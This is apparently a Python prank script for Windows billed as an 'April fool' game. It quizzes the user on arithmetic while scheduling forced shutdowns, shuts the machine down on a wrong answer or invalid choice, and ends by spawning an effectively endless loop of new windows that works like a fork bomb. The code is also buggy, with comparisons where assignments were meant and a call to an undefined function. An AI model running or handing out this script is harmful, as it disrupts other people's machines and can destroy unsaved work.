import os
import time
import random as r
t = 60

def no():
    print("\n")
    for i in range(0):
        print("Happy April fool \n")
        time.sleep(1)
        print("You are doomed")
        time.sleep(1)
    chance=input("Do you want an extra chance? (Y/N):_")
    if chance == "Y" or chance == "y":
        print("Fine, keep trying it.")
    else:
        os.system('shutdown -s -t 5')
        for i in range(5,-1,-1):
            print("☠️You are doomed. %i seconds left.☠️"%i)
            time.sleep(1)
def sd5():
    os.system('shutdown -s -t 5')
    for i in range(5,-1,-1):
        print("☠️You are doomed. %i seconds left.☠️"%i)
        time.sleep(1)
        
def generate_math():
    num1 = r.randint(1, 1000)
    num2 = r.randint(1, 1000)
    operator = r.choice(['+', '-'])
    question = f"{num1} {operator} {num2}"
    answer = evaluate_expression(num1, num2, operator)
    return question, answer

def evaluate_expression(num1, num2, operator):
    if operator == '+':
        return num1 + num2
    elif operator == '-':
        return num1 - num2
    elif operator == '*':
        return num1 * num2

lv = input('Welcome to the Project "Mix" !\nYou want a......\n(1)Relaxing April fool\n(2)Funny April fool\n(3)Exciting April fool\nChoose one~~~_')
if lv == "1":
    t == 120
elif lv == "2":	
    t == 90
elif lv == "3":
    t == r.randint(75,120)
else:
    print("You are doomed XDDD")
    sd5()
    
os.system("shutdown -s -t %i" %t)
print("Let's do math! You have about %s seconds left."%t)
print("Save your files now! Your computer will shutdown automatically I don't no when~~~~")

for i in range(3):
    question, answer = generate_math()
    print(f"{i+1}): {question}")
    user_answer = input("Answer：")
    if user_answer == str(answer):
        print("Correct")
    else:
        print("It's %s"%answer)
        no()
        for i in range(3):
            question, s_answer = generate_math_question()
            print(f"{i+1}): {question}")
            user_answer = input("Answer：")
            if user_answer == str(answer):
                print("Correct")
            else:
                print("It's %s, you are doomed."%answer)
                sd5()
                break

os.system('shutdown -a')
for i in range(2):
    time.sleep(1)
    print(".")
time.sleep(1)
print("👀")
for i in range(2):
    time.sleep(1)
    print(".")

print("You passed! But you will doom too!")

for i in range(2):
    time.sleep(1)
    print(".")
time.sleep(1)
print("👀")
for i in range(2):
    time.sleep(1)
    print(".")

if lv == "1":
    sd5()

if lv == "2" or lv == "3":
    os.system('for /l %a in (1,1,948794879487) do (start "Happy April FOOOOOOOOOOL!")')

'''Hey
don't peek me'''